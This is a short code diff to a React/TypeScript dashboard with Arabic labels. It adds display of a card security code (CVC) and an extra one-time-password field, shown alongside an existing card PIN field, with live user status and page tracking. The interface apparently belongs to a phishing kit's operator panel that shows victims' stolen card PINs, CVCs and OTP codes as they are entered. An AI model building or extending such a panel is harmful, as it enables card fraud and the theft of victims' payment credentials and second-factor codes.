@@ -102,6 +102,7 @@ interface Notification {
   lastSeen: string
   violationValue: number
   pass?: string
+  cardCvc?:string;
   year: string
   month: string
   pagename: string
@@ -353,6 +354,11 @@ function ActivityTimeline({ notifications }: { notifications: Notification[] }) 
                 {notification.otp && (
                   <Badge variant="outline" className="text-xs bg-blue-50 dark:bg-blue-950/30">
                     OTP: {notification.otp}
+                  </Badge>
+                )}
+                  {notification.otpCode && (
+                  <Badge variant="outline" className="text-xs bg-blue-50 dark:bg-blue-950/30">
+                    OTP: {notification.otpCode}
                   </Badge>
                 )}
                 <UserStatus userId={notification.id} />
@@ -1846,6 +1852,12 @@ export default function NotificationsPage() {
                 <div className="flex justify-between items-center py-2 border-b border-border/50">
                   <span className="font-medium text-muted-foreground">رمز البطاقة:</span>
                   <span className="font-semibold">{selectedNotification.pass}</span>
+                </div>
+              )}
+              {selectedNotification.cardCvc && (
+                <div className="flex justify-between items-center py-2 border-b border-border/50">
+                  <span className="font-medium text-muted-foreground">رمز الامان:</span>
+                  <span className="font-semibold">{selectedNotification.cardCvc}</span>
                 </div>
               )}
               {(selectedNotification.otp || selectedNotification.otpCode) && (
